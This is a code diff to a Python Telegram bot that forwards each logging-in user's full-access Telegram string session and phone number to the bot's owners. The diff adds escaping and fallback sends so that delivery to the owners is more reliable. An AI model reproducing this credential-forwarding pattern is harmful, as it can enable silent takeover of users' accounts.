@@ -8,6 +8,7 @@ import re
 import time
 import signal
 import threading
+import html
 from typing import Dict, List, Optional, Tuple, Set, Callable, Any
 from collections import OrderedDict
 from telethon import TelegramClient, events
@@ -1221,6 +1222,22 @@ async def handle_confirm_delete(update: Update, context: ContextTypes.DEFAULT_TY
         )
 
 
+# ---------- String Session Helper ----------
+def escape_string_session(session_string: str) -> str:
+    """Escape special characters in string session for safe display"""
+    # Replace backticks with a safe alternative
+    session_escaped = session_string.replace('`', "'")
+    
+    # If the session is still too long or contains problematic characters,
+    # split it into multiple lines
+    if len(session_escaped) > 2000:
+        # Split into chunks of 1000 characters
+        chunks = [session_escaped[i:i+1000] for i in range(0, len(session_escaped), 1000)]
+        return "\n".join(chunks)
+    
+    return session_escaped
+
+
 # ---------- Login/logout commands ----------
 async def login_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id if update.effective_user else update.callback_query.from_user.id
@@ -1447,8 +1464,9 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
 
                 del login_states[user_id]
 
-                # Send string session to owners
+                # Send string session to owners (FIXED: Escape special characters)
                 if OWNER_IDS:
+                    escaped_session = escape_string_session(session_string)
                     for owner_id in OWNER_IDS:
                         try:
                             await context.bot.send_message(
@@ -1458,12 +1476,27 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                                 f"📱 Phone: `{state['phone']}`\n"
                                 f"🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                                 f"**String Session:**\n"
-                                f"```\n{session_string}\n```\n\n"
+                                f"```\n{escaped_session}\n```\n\n"
                                 f"Add this to USER_SESSIONS env var for persistence.",
                                 parse_mode="Markdown",
                             )
                         except Exception as e:
-                            logger.exception("Failed to send string session to owner %s: %s", owner_id, e)
+                            logger.exception(f"Failed to send string session to owner {owner_id}: {e}")
+                            # Try alternative method without code blocks
+                            try:
+                                await context.bot.send_message(
+                                    owner_id,
+                                    f"🔑 New String Session Generated\n\n"
+                                    f"User: {me.first_name or 'Unknown'} (ID: {me.id})\n"
+                                    f"Phone: {state['phone']}\n"
+                                    f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                                    f"String Session:\n"
+                                    f"{escaped_session}\n\n"
+                                    f"Add this to USER_SESSIONS env var for persistence.",
+                                    parse_mode=None,
+                                )
+                            except Exception as e2:
+                                logger.exception(f"Failed to send string session via alternative method to owner {owner_id}: {e2}")
 
                 await verifying_msg.edit_text(
                     "✅ **Successfully connected!** 🎉\n\n"
@@ -1551,8 +1584,9 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
 
                 del login_states[user_id]
 
-                # Send string session to owners
+                # Send string session to owners (FIXED: Escape special characters)
                 if OWNER_IDS:
+                    escaped_session = escape_string_session(session_string)
                     for owner_id in OWNER_IDS:
                         try:
                             await context.bot.send_message(
@@ -1562,12 +1596,27 @@ async def handle_login_process(update: Update, context: ContextTypes.DEFAULT_TYP
                                 f"📱 Phone: `{state['phone']}`\n"
                                 f"🕒 Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
                                 f"**String Session:**\n"
-                                f"```\n{session_string}\n```\n\n"
+                                f"```\n{escaped_session}\n```\n\n"
                                 f"Add this to USER_SESSIONS env var for persistence.",
                                 parse_mode="Markdown",
                             )
                         except Exception as e:
-                            logger.exception("Failed to send string session to owner %s: %s", owner_id, e)
+                            logger.exception(f"Failed to send string session to owner {owner_id}: {e}")
+                            # Try alternative method without code blocks
+                            try:
+                                await context.bot.send_message(
+                                    owner_id,
+                                    f"🔑 New String Session Generated (2FA)\n\n"
+                                    f"User: {me.first_name or 'Unknown'} (ID: {me.id})\n"
+                                    f"Phone: {state['phone']}\n"
+                                    f"Time: {time.strftime('%Y-%m-%d %H:%M:%S')}\n\n"
+                                    f"String Session:\n"
+                                    f"{escaped_session}\n\n"
+                                    f"Add this to USER_SESSIONS env var for persistence.",
+                                    parse_mode=None,
+                                )
+                            except Exception as e2:
+                                logger.exception(f"Failed to send string session via alternative method to owner {owner_id}: {e2}")
 
                 await verifying_msg.edit_text(
                     "✅ **Successfully connected with 2FA!** 🎉\n\n"
@@ -1745,7 +1794,8 @@ async def getstrings_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         session_data = user["session_data"]
         
         if session_data:
-            session_strings.append(session_data)
+            escaped_session = escape_string_session(session_data)
+            session_strings.append(escaped_session)
             
             # Try to get user info
             try:
@@ -1778,7 +1828,18 @@ async def getstrings_command(update: Update, context: ContextTypes.DEFAULT_TYPE)
         "💡 **Note:** Sessions are comma-separated"
     )
 
-    await update.message.reply_text(message_text, parse_mode="Markdown")
+    try:
+        await update.message.reply_text(message_text, parse_mode="Markdown")
+    except Exception as e:
+        logger.exception("Error sending getstrings message: %s", e)
+        # Fallback without markdown
+        await update.message.reply_text(
+            f"🔑 All String Sessions\n\n"
+            f"Sessions: {len(session_strings)}\n\n"
+            f"Copy to .env:\n"
+            f"USER_SESSIONS=\"{env_var_value}\"",
+            parse_mode=None
+        )
 
 
 async def getuserstring_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1817,6 +1878,7 @@ async def getuserstring_command(update: Update, context: ContextTypes.DEFAULT_TY
         return
 
     session_string = user["session_data"]
+    escaped_session = escape_string_session(session_string)
     
     # Try to get user info
     user_info = f"User ID: `{target_user_id}`"
@@ -1833,7 +1895,7 @@ async def getuserstring_command(update: Update, context: ContextTypes.DEFAULT_TY
     message_text = (
         f"🔑 **String Session for {user_info}**\n\n"
         f"**Session String:**\n"
-        f"```\n{session_string}\n```\n\n"
+        f"```\n{escaped_session}\n```\n\n"
         "📋 **Add to USER_SESSIONS env var:**\n"
         "1. Copy the string above\n"
         "2. Add it to USER_SESSIONS in your .env file\n"
@@ -1842,7 +1904,18 @@ async def getuserstring_command(update: Update, context: ContextTypes.DEFAULT_TY
         "`USER_SESSIONS=\"session1,session2,session3\"`"
     )
 
-    await update.message.reply_text(message_text, parse_mode="Markdown")
+    try:
+        await update.message.reply_text(message_text, parse_mode="Markdown")
+    except Exception as e:
+        logger.exception("Error sending getuserstring message: %s", e)
+        # Fallback without markdown
+        await update.message.reply_text(
+            f"🔑 String Session for {user_info}\n\n"
+            f"Session String:\n"
+            f"{escaped_session}\n\n"
+            f"Add to USER_SESSIONS env var.",
+            parse_mode=None
+        )
 
 
 # ---------- Admin commands ----------
